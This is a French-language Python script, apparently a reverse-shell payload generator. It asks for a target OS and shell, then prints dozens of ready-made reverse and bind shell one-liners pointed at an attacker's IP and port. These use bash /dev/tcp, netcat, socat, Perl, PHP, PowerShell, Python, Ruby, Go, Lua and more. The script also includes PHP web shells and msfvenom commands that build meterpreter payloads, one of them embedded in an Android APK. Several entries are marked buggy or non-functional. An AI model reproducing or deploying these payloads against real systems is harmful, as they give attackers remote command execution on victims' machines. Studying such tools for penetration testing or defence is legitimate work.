...
shells = {
    'linux': ['sh', '/bin/sh', 'bash', '/bin/bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash'],
    'android': ['sh', '/bin/sh', 'bash', '/bin/bash', 'ash', 'zsh'],
    'mac': ['sh', '/bin/sh', 'bash', '/bin/bash', 'zsh', '/bin/zsh'],
    'windows': ['cmd', 'powershell', 'pwsh'],
    'appleIOS': ["sh", "bash", "zsh", "ash", "fish", "iSH", "a-Shell"]

}

def shell_using(os_choix):
    compte = 0
    for shell in shells[os_choix]:
        print(compte, ")", shell)
        compte += 1
    question_shell = int(input("Quelle shell voulez vous utiliser? "))
    print("\n------------------------------------------------------------\n")
    shell = shells[os_choix][question_shell]
    return shell

# Fonction pour récupérer la commande associée à un nom
def get_command_by_name(search_name):
    for faille in failles_secu:
        if faille["name"] == search_name:
            print("\n----------------------------------------------------------------\n")
            print(faille["name"])
            print("\n\n")
            print(faille["command"])
            print("\n\n")
            print(faille["meta"])
            print("\n----------------------------------------------------------------\n")
    return None  # Si le nom n'est pas trouvé

k = 0
for os_cible in os_cibles:
    print(k, ")", os_cible)
    k += 1
finder = int(input("Quelle système d'exploitation choissiez vous : "))


shell = shell_using(os_cibles[finder])
print("\n\n")

failles_secu = [
    {
        "name": "Bash -i",
        "command": f"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Bash 196",
        "command": f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Bash read line",
        "command": f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Bash 5",
        "command": f"{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Bash udp",
        "command": f"{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
        "meta": ["linux", "mac"]
    },
    {
        "name": "nc mkfifo",
        "command": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
        "meta": ["linux", "mac"]
    },
    {
        "name": "nc -e",
        "command": f"nc {ip} {port} -e {shell}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "nc.exe -e",
        "command": f"nc.exe {ip} {port} -e {shell}",
        "meta": ["windows"]
    },
    {
        "name": "BusyBox nc -e",
        "command": f"busybox nc {ip} {port} -e {shell}",
        "meta": ["linux"]
    },
    {
        "name": "nc -c",
        "command": f"nc -c {shell} {ip} {port}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "ncat -e",
    ...
    {
        "name": "ncat.exe -e",
        "command": f"ncat.exe {ip} {port} -e {shell}",
        "meta": ["windows"]
    },
    {
        "name": "ncat udp",
        "command": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
        "meta": ["linux", "mac"]
    },
    {
        "name": "curl",
        "command": f"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
        "meta": ["linux", "mac"]
    },
    {
        "name": "rustcat",
        "command": f"rcat connect -s {shell} {ip} {port}",
        "meta": ["linux", "mac"]
    },
    ...
    {
        "name": "OpenSSL",
        "command": f"mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Perl",
        "command": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");}};'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Perl no sh",
        "command": f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "meta": ["linux", "mac"]
    },
    {
    ...
    {
        "name": "PHP cmd 2",
        "command": r"<?php if(isset($_REQUEST[\"cmd\"])){{ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"<\/pre>\"; die; }}?>",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP cmd small",
    ...
    {
        "name": "PHP exec",
        "command": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "PHP shell_exec",
        "command": f"php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "PHP system",
        "command": f"php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP passthru",
        "command": f"php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "PHP `",
        "command": f"php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP popen",
        "command": f"php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "PHP proc_open",
        "command": f"php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"{shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "Windows ConPty",
        "command": f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell #1",
    ...
    {
        "name": "PowerShell #3",
        "command": f'''powershell -nop -W hidden -noni -ep bypass -c $client = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $client.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$client.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()''',
        "meta": ["windows"]
    },
    {
    ...
    {
        "name": "Python #1",
        "command": f"export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Python #2",
        "command": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Python3 #1",
        "command": f"export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Python3 #2",
        "command": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
        "meta": ["linux", "mac"]
    },
    {
    ...
    },
    {
        ...
        "command": f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
        "meta": ["linux"]
    },
    {
        "name": "Ruby #1",
        "command": f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Ruby no sh",
        "command": f"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts \"failed: #{{$_}}\"}}'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "socat #1",
        "command": f"socat TCP:{ip}:{port} EXEC:{shell}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "socat #2 (TTY)",
        "command": f"socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
        "meta": ["linux", "mac"]
    },
    {
        "name": "sqlite3 nc mkfifo",
        "command": f"sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "node.js",
        "command": f"require('child_process').exec('nc -e {shell} {ip} {port}')",
        "meta": ["linux", "mac"]
    },
    {
        "name": "node.js #2 (BUG)",
    ...
    {
        "name": "telnet",
        "command": f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
        "meta": ["linux", "mac"]
    },
    {
        "name": "zsh",
        "command": f"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Lua #1",
        "command": f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
        "meta": ["linux"]
    },
    {
        "name": "Lua #2",
        "command": f"lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
        "meta": ["linux", "windows"]
    },
    {
        "name": "Golang",
        "command": f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        "meta": ["linux", "mac", "windows"]
    },
    {
        "name": "Vlang",
        "command": f"echo 'import os' > /tmp/t.v && echo 'fn main() {{ os.system(\"nc -e {shell} {ip} {port} 0>&1\") }}' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Awk",
    ...
    {
        "name": "Crystal (system)",
        "command": f"crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}}'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "Crystal (code)",
    ...
    {
        "name": "Python3 Bind",
        "command": f"python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
        "meta": ["bind", "mac", "linux", "windows"]
    },
    {
        "name": "PHP Bind (BUG)",
        "command": r"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"{ip}\",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){{if(!socket_write($cl,\"$ \",2))exit;\$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){{$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}} }}'",
        "meta": ["bind", "mac", "linux", "windows"]
    },
    {
    ...
    },
    {
        ...
        "command": f"msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
    },
    {
        "name": "Android Meterpreter Reverse TCP",
        "command": f"msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
        "meta": ["msfvenom", "android", "android", "reverse"]
    },
    {
        "name": "Android Meterpreter Embed Reverse TCP",
        "command": f"msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
        "meta": ["msfvenom", "android", "android", "reverse"]
    },
    {
        "name": "Apple iOS Meterpreter Reverse TCP Inline",
        "command": f"msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",
        "meta": ["msfvenom", "apple_ios", "apple_ios", "reverse"]
    },
    {
        "name": "Python Stageless Reverse TCP",
        "command": f"msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
    },
    {
        "name": "Bash Stageless Reverse TCP",
        "command": f"msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",
        "meta": ["msfvenom", "linux", "macos", "stageless", "reverse"]
    },
    {
        "name": "Windows CMD cURL (NON FONCTIONELLE)",
        "command": r"@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\cmd.bat & type !temp!\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\cmd.bat > !tmp!\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\out.txt > NUL)) & timeout 1\" > NUL",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell IEX",
        "command": f"$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{{\"Authorization\"=$i}};while ($true){{$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{{\"Authorization\"=$i}});if ($c -ne 'None') {{$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{{\"Authorization\"=$i}} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')}} sleep 0.8}}",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell IEX Constr Lang Mode",
        "command": f"$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{{\"Authorization\"=$i}};while ($true){{$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{{\"Authorization\"=$i}});if ($c -ne 'None') {{$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{{\"Authorization\"=$i}} -Body ($e+$r)}} sleep 0.8}}",
        "meta": ["windows"]
    },
    {
        "name": "Windows CMD cURL https (NON FONCONTIONELLLE)",
        "command": r"@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\cmd.bat & type !temp!\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\cmd.bat > !tmp!\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\out.txt > NUL)) & timeout 1\" > NUL",
        "meta": ["windows"]
    },
    {
...
for faille in failles_secu:
    for nom_os in faille['meta']:
        ...
        if finder == 3:
            if 'apple_ios' == nom_os:
                print(faille['name'], " ", faille['command'])
        if finder == 4:
            if 'android' == nom_os:
                print(faille['name'], " ", faille['command'])

print("\n----------------------------------------------------------------\n")
print("os : ", os_cibles[finder], "\nshell : ", shell)
print("\n----------------------------------------------------------------\n")

while True:
    search_name = str(input("choisiez votre reverseshell : "))
